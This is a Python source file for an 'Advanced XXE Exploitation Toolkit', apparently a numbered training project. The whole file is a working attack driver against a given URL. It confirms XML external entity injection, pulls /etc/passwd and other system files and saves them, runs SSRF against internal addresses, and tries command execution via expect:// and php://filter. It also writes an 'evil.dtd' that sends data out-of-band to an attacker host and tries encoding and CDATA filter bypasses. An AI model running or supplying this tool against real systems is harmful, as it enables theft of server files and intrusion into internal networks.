#!/usr/bin/env python3
"""
xxe_toolkit.py — Advanced XXE Exploitation Toolkit
Project #43
"""

import argparse
import json
import os
import time
from datetime import datetime

import requests

import xxe_payloads as P

REPORTS_DIR = "reports"
EXTRACTED_DIR = "extracted"
DEFAULT_TIMEOUT = 10

class Colors:
    GREEN   = "\033[92m"
    RED     = "\033[91m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    RESET   = "\033[0m"
    BOLD    = "\033[1m"

class XXEToolkit:
    def __init__(self, target_url, attacker_host="127.0.0.1",
                 attacker_port=8888, timeout=DEFAULT_TIMEOUT,
                 content_type="application/xml"):
        self.target_url = target_url
        self.attacker_host = attacker_host
        self.attacker_port = attacker_port
        self.timeout = timeout
        self.content_type = content_type

        os.makedirs(REPORTS_DIR, exist_ok=True)
        os.makedirs(EXTRACTED_DIR, exist_ok=True)
        os.makedirs("listener", exist_ok=True)

        self.report = {
            "target": target_url,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "phases": {},
        }

    def _send_xml(self, payload, content_type=None):
        ct = content_type or self.content_type
        if isinstance(payload, str):
            payload = payload.encode("utf-8")
        t0 = time.time()
        try:
            r = requests.post(
                self.target_url,
                data=payload,
                headers={"Content-Type": ct},
                timeout=self.timeout,
            )
            return r.status_code, r.text, time.time() - t0
        except requests.exceptions.Timeout:
            return None, "[TIMEOUT]", time.time() - t0
        except Exception as e:
            return None, f"[ERROR] {type(e).__name__}: {e}", time.time() - t0

    def _has_indicator(self, body, category):
        if not body:
            return False
        for ind in P.INDICATORS.get(category, []):
            if ind in body:
                return True
        return False

    def phase1_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 1] XXE DETECTION{Colors.RESET}")
        results = {}

        print(f"\n  [BASIC] Testing basic XXE")
        payload = P.basic_payload()
        status, body, elapsed = self._send_xml(payload)
        hit = self._has_indicator(body, "file_content") or "root:x:" in (body or "")
        if hit:
            print(f"    {Colors.GREEN}[+] XXE CONFIRMED!{Colors.RESET} /etc/passwd content in response")
            print(f"    Preview: {(body or '')[:200]}")
            with open(f"{EXTRACTED_DIR}/etc_passwd_via_basic.txt", "w") as f:
                f.write(body)
            results["basic"] = {"confirmed": True, "evidence": body[:500]}
        else:
            print(f"    {Colors.YELLOW}[-] No file content{Colors.RESET}")
            results["basic"] = {"confirmed": False, "snippet": (body or "")[:200]}

        print(f"\n  [ERROR_BASED] Testing error-based XXE")
        payload = P.error_based_payload()
        status, body, elapsed = self._send_xml(payload)
        hit = bool(body) and ("XML ERROR" in body or "SyntaxError" in body
                              or "ENTITY" in body.upper())
        if hit:
            print(f"    {Colors.GREEN}[+] Error-based XXE triggered{Colors.RESET}")
            results["error_based"] = {"confirmed": True, "evidence": body[:300]}
        else:
            print(f"    {Colors.YELLOW}[-] No error-based leak{Colors.RESET}")
            results["error_based"] = {"confirmed": False}

        print(f"\n  [BLIND_OOB] Testing blind XXE (self-callback)")
        dtd_url = f"http://{self.attacker_host}:{self.attacker_port}/evil.dtd"
        payload = P.blind_oob_payload(dtd_url)
        status, body, elapsed = self._send_xml(payload)
        print(f"    {Colors.YELLOW}[~] Payload sent (status={status}){Colors.RESET}")
        results["blind_oob"] = {"attempted": True, "dtd_url": dtd_url, "target_status": status}

        self.report["phases"]["detection"] = results

    def phase2_file_extraction(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 2] FILE EXTRACTION{Colors.RESET}")
        results = []

        for filepath in P.LINUX_FILES:
            print(f"\n    [LINUX] {filepath}")
            payload = P.basic_payload(f"file://{filepath}")
            status, body, elapsed = self._send_xml(payload)

            hit = False
            if body and "[PARSED OK]" in body:
                inner = body.split("[PARSED OK]", 1)[1].strip()
                if len(inner) > 5:
                    hit = True

            if hit:
                print(f"      {Colors.GREEN}[+] SUCCESS ({len(body)} bytes){Colors.RESET}")
                print(f"      Preview: {body[:150]}")
                safe = filepath.replace("/", "_").strip("_")
                with open(f"{EXTRACTED_DIR}/{safe}.txt", "w") as f:
                    f.write(body)
            else:
                print(f"      {Colors.YELLOW}[-] No content / blocked{Colors.RESET}")

            results.append({
                "file": filepath,
                "extracted": hit,
                "size": len(body) if body else 0,
                "snippet": (body or "")[:300],
            })

        self.report["phases"]["file_extraction"] = results

    def phase3_ssrf(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 3] SSRF VIA XXE{Colors.RESET}")
        results = {}

        for name, url in P.SSRF_TARGETS.items():
            print(f"\n    [{name.upper()}] {url}")
            payload = P.ssrf_payload(url)
            status, body, elapsed = self._send_xml(payload)

            hit = False
            if body and "[PARSED OK]" in body:
                inner = body.split("[PARSED OK]", 1)[1].strip()
                if len(inner) > 5:
                    hit = True

            if hit:
                print(f"      {Colors.GREEN}[+] SSRF SUCCESS!{Colors.RESET}")
                print(f"      Preview: {body[:200]}")
            else:
                print(f"      {Colors.YELLOW}[-] No SSRF response{Colors.RESET}")

            results[name] = {"url": url, "hit": hit, "snippet": (body or "")[:300]}

        self.report["phases"]["ssrf"] = results

    def phase4_rce(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 4] RCE VIA XXE{Colors.RESET}")
        results = {}

        print(f"\n    [EXPECT] expect://id")
        payload = P.rce_expect_payload("id")
        status, body, elapsed = self._send_xml(payload)
        hit = self._has_indicator(body, "rce_success")
        tag = (f"{Colors.RED}[+] RCE!{Colors.RESET}"
               if hit else f"{Colors.YELLOW}[-] rejected (expected on Python target){Colors.RESET}")
        print(f"      {tag}")
        results["expect"] = {"hit": hit, "snippet": (body or "")[:300]}

        print(f"\n    [PHP_FILTER] php://filter.../etc/passwd")
        payload = P.rce_php_filter_payload("/etc/passwd")
        status, body, elapsed = self._send_xml(payload)
        hit = bool(body) and ("cm9vd" in body or "cm9vdA" in body)
        tag = (f"{Colors.RED}[+] PHP FILTER!{Colors.RESET}"
               if hit else f"{Colors.YELLOW}[-] rejected (expected on Python target){Colors.RESET}")
        print(f"      {tag}")
        results["php_filter"] = {"hit": hit, "snippet": (body or "")[:300]}

        self.report["phases"]["rce"] = results

    def phase5_blind_oob(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 5] BLIND XXE PREP{Colors.RESET}")
        dtd = P.ATTACKER_DTD.replace("ATTACKER_HOST", self.attacker_host) \
                            .replace("ATTACKER_PORT", str(self.attacker_port))
        dtd_path = os.path.abspath("listener/evil.dtd")
        with open(dtd_path, "w") as f:
            f.write(dtd)
        print(f"    {Colors.GREEN}[+] Wrote evil DTD: {dtd_path}{Colors.RESET}")

        dtd_url = f"http://{self.attacker_host}:{self.attacker_port}/evil.dtd"
        payload = P.blind_oob_payload(dtd_url)
        payload_path = os.path.abspath("listener/blind_payload.xml")
        with open(payload_path, "w") as f:
            f.write(payload)
        print(f"    {Colors.GREEN}[+] Wrote blind payload: {payload_path}{Colors.RESET}")

        print(f"\n    [OOB_SEND] Sending blind XXE payload...")
        status, body, elapsed = self._send_xml(payload)
        print(f"    Response: HTTP {status}, {len(body or '')} bytes")

        self.report["phases"]["blind_oob"] = {
            "dtd_path": dtd_path,
            "payload_path": payload_path,
            "dtd_url": dtd_url,
            "target_status": status,
        }

    def phase6_filter_bypass(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 6] FILTER BYPASS{Colors.RESET}")
        results = {}

        tests = [
            ("utf16_le", P.utf16_payload, "UTF-16 LE"),
            ("utf16_be", P.utf16_be_payload, "UTF-16 BE"),
            ("comment", P.comment_bypass_payload, "Comment-injected"),
            ("cdata", P.cdata_bypass_payload, "CDATA-wrapped"),
        ]

        for key, fn, label in tests:
            print(f"\n    [{key.upper()}] {label}")
            payload = fn()
            status, body, elapsed = self._send_xml(payload)
            hit = self._has_indicator(body, "file_content") or "root:x:" in (body or "")
            tag = (f"{Colors.GREEN}[+] PASSED{Colors.RESET}"
                   if hit else f"{Colors.YELLOW}[-] blocked{Colors.RESET}")
            print(f"      {tag}")
            results[key] = {"hit": hit, "snippet": (body or "")[:200]}

        self.report["phases"]["filter_bypass"] = results

    def phase7_wrappers(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 7] SVG / SOAP XXE{Colors.RESET}")
        results = {}

        print(f"\n    [SVG] SVG-based XXE")
        payload = P.svg_xxe_payload()
        status, body, elapsed = self._send_xml(payload, content_type="image/svg+xml")
        hit = self._has_indicator(body, "file_content") or "root:x:" in (body or "")
        tag = (f"{Colors.GREEN}[+] SVG XXE!{Colors.RESET}"
               if hit else f"{Colors.YELLOW}[-] rejected{Colors.RESET}")
        print(f"      {tag}")
        results["svg"] = {"hit": hit, "snippet": (body or "")[:200]}

        print(f"\n    [SOAP] SOAP-based XXE")
        payload = P.soap_xxe_payload()
        status, body, elapsed = self._send_xml(payload, content_type="text/xml")
        hit = self._has_indicator(body, "file_content") or "root:x:" in (body or "")
        tag = (f"{Colors.GREEN}[+] SOAP XXE!{Colors.RESET}"
               if hit else f"{Colors.YELLOW}[-] rejected{Colors.RESET}")
        print(f"      {tag}")
        results["soap"] = {"hit": hit, "snippet": (body or "")[:200]}

        self.report["phases"]["wrappers"] = results

    def _collect_confirmed(self):
        confirmed = []
        for phase, data in self.report["phases"].items():
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, dict):
                        if (v.get("confirmed") or v.get("hit")
                                or v.get("extracted")):
                            confirmed.append(f"{phase}.{k}")
                    elif isinstance(v, list):
                        for item in v:
                            if isinstance(item, dict) and item.get("extracted"):
                                confirmed.append(
                                    f"{phase}.{k}[{item.get('file','')}]"
                                )
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and item.get("extracted"):
                        confirmed.append(f"{phase}.{item.get('file','')}")
        return confirmed

    def phase8_report(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 8] EXPLOITATION SUMMARY{Colors.RESET}")
        confirmed = self._collect_confirmed()
        print(f"\n    Total confirmed findings: {len(confirmed)}")
        for c in confirmed:
            print(f"      * {c}")

        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        json_path = f"{REPORTS_DIR}/xxe_report_{ts}.json"
        with open(json_path, "w") as f:
            json.dump(self.report, f, indent=2, default=str)
        print(f"\n    {Colors.GREEN}[OK] JSON: {json_path}{Colors.RESET}")

        html_path = f"{REPORTS_DIR}/xxe_report_{ts}.html"
        with open(html_path, "w") as f:
            f.write(self._build_html(confirmed))
        print(f"    {Colors.GREEN}[OK] HTML: {html_path}{Colors.RESET}")

    def _build_html(self, confirmed):
        rows = ""
        for phase, data in self.report["phases"].items():
            rows += f"<h3>{phase}</h3><pre>{json.dumps(data, indent=2, default=str)[:2500]}</pre>"
        return f"""<!DOCTYPE html><html><head><title>XXE Report</title>
<style>
body {{ font-family: monospace; background:#111; color:#eee; padding:20px; }}
h1 {{ color:#ff5555; }} h3 {{ color:#55ff55; border-bottom:1px solid #333; }}
pre {{ background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }}
</style></head><body>
<h1>XXE Exploitation Report</h1>
<p><b>Target:</b> {self.target_url}</p>
<p><b>Timestamp:</b> {self.report['timestamp']}</p>
<p>Confirmed: {len(confirmed)}</p>
<ul>{''.join(f'<li>{c}</li>' for c in confirmed)}</ul>
{rows}
</body></html>"""

    def run_all(self):
        print("=" * 64)
        print("  Advanced XXE Exploitation Toolkit - Project #43")
        print("=" * 64)
        print(f"[+] Target: {self.target_url}")
        self.phase1_detection()
        self.phase2_file_extraction()
        self.phase3_ssrf()
        self.phase4_rce()
        self.phase5_blind_oob()
        self.phase6_filter_bypass()
        self.phase7_wrappers()
        self.phase8_report()

def main():
    ap = argparse.ArgumentParser(description="Advanced XXE Exploitation Toolkit")
    ap.add_argument("-t", "--target", required=True)
    ap.add_argument("--attacker-host", default="127.0.0.1")
    ap.add_argument("--attacker-port", type=int, default=8888)
    ap.add_argument("--timeout", type=int, default=10)
    ap.add_argument("--content-type", default="application/xml")
    args = ap.parse_args()

    toolkit = XXEToolkit(
        target_url=args.target,
        attacker_host=args.attacker_host,
        attacker_port=args.attacker_port,
        timeout=args.timeout,
        content_type=args.content_type,
    )
    toolkit.run_all()

if __name__ == "__main__":
    main()
